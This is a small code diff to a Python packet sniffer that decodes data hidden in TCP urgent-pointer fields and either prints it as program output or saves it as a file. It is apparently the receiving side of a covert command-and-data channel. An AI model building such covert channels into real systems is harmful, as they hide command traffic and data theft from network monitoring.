@@ -84,6 +84,7 @@ def uninstall():
 def packet_callback(packet):
     """Callback function to process each sniffed packet."""
     global received_data
+    global current_signal
     if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
         urgent_pointer_value = packet[TCP].urgptr
         urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode(errors='ignore')
@@ -99,7 +100,7 @@ def packet_callback(packet):
             if urgent_pointer_value == eof_signal:
                 print("EOF signal detected.")
                 if current_signal == "RUN":
-                    print(decoded_data)
+                    print(f"Program output:\n{decoded_data}\n")
                 else:
                     save_file(decoded_data)
                 current_signal = None  # Reset current_signal after handling
